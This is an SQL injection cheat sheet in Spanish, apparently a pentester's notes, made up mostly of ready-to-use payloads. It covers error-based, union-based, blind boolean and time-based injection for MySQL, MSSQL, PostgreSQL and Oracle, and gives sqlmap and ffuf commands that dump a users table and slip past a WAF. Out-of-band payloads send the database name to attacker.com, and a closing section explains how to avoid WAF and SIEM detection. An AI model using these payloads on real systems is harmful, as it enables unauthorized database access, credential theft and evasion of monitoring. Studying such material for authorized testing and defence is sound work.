---
tags: [web, sqli]
status: done
---

# SQL Injection

---

## Detección Rápida

```
# Caracteres de ruptura
'   "   `   ')   "))   '-- -   "-- -

# Boolean-based
' AND 1=1-- -    → respuesta normal
' AND 1=2-- -    → respuesta diferente → SQLi confirmado

# Error-based
'                → error SQL visible → SQLi + DB type
```

---

## Error-Based (MySQL)

```sql
-- Extraer versión
' AND extractvalue(1, concat(0x7e, version()))-- -

-- Extraer base de datos actual
' AND extractvalue(1, concat(0x7e, database()))-- -

-- Extraer tablas
' AND extractvalue(1, concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -
```

---

## Union-Based

```sql
-- 1. Determinar número de columnas
' ORDER BY 1-- -
' ORDER BY 2-- -   → hasta que rompa

-- 2. Encontrar columnas visibles
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 1,2,3-- -

-- 3. Extraer datos
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,concat(username,':',password),3 FROM users-- -
```

---

## Blind Boolean-Based

```sql
-- ¿El primer carácter de la BBDD empieza por 'a'?
' AND SUBSTRING(database(),1,1)='a'-- -

-- Script con ffuf
# Wordlist: a-z0-9 → fuzzear cada posición
ffuf -u "https://target.com/page?id=1' AND SUBSTRING(database(),FUZZ_POS,1)='FUZZ_CHAR'-- -" \
     -w pos.txt:FUZZ_POS -w chars.txt:FUZZ_CHAR
```

---

## Blind Time-Based

```sql
-- MySQL
' AND SLEEP(5)-- -

-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL
'; SELECT pg_sleep(5)-- -

-- Oracle
' AND 1=(SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5))-- -
```

---

## Out-of-Band (OOB)

```sql
-- MySQL — requiere FILE privilege + outbound DNS
' AND LOAD_FILE(concat('\\\\',database(),'.attacker.com\\a'))-- -

-- MSSQL — xp_cmdshell o xp_dirtree
'; exec master..xp_dirtree '\\attacker.com\share'-- -
```

---

## SQLMap

```bash
# Básico
sqlmap -u "https://target.com/page?id=1" --dbs

# POST request
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" -p user

# Desde request de Burp
sqlmap -r request.txt --dbs

# Extraer tabla concreta
sqlmap -r request.txt -D database -T users --dump

# Con bypass WAF
sqlmap -r request.txt --tamper=space2comment,between,charencode --random-agent

# Blind con threads
sqlmap -r request.txt --technique=T --time-sec=3 --threads=5
```

---

## SQLi en JSON/XML

```json
// JSON body — probar en cada campo
{"user": "admin'-- -", "pass": "test"}
{"user": "admin' AND 1=1-- -", "pass": "test"}
```

```xml
<!-- XXE-style SQLi -->
<user>admin' AND 1=1-- -</user>
```

---

## Second-Order SQLi

```
1. Registrar usuario con nombre: admin'-- -
2. El nombre se guarda escapado en BBDD
3. Otra función carga el nombre y lo inserta en query SIN escapar
4. Payload ejecutado en el segundo uso
```

---

## OPSEC / Detección

- SQLMap deja un rastro brutal — WAF + SIEM lo detectan → usar `--delay`, `--random-agent`, tampers
- Error-based da mucha info pero genera logs de error en servidor
- Blind time-based es más silencioso pero lento
- OOB requiere conectividad saliente desde el servidor

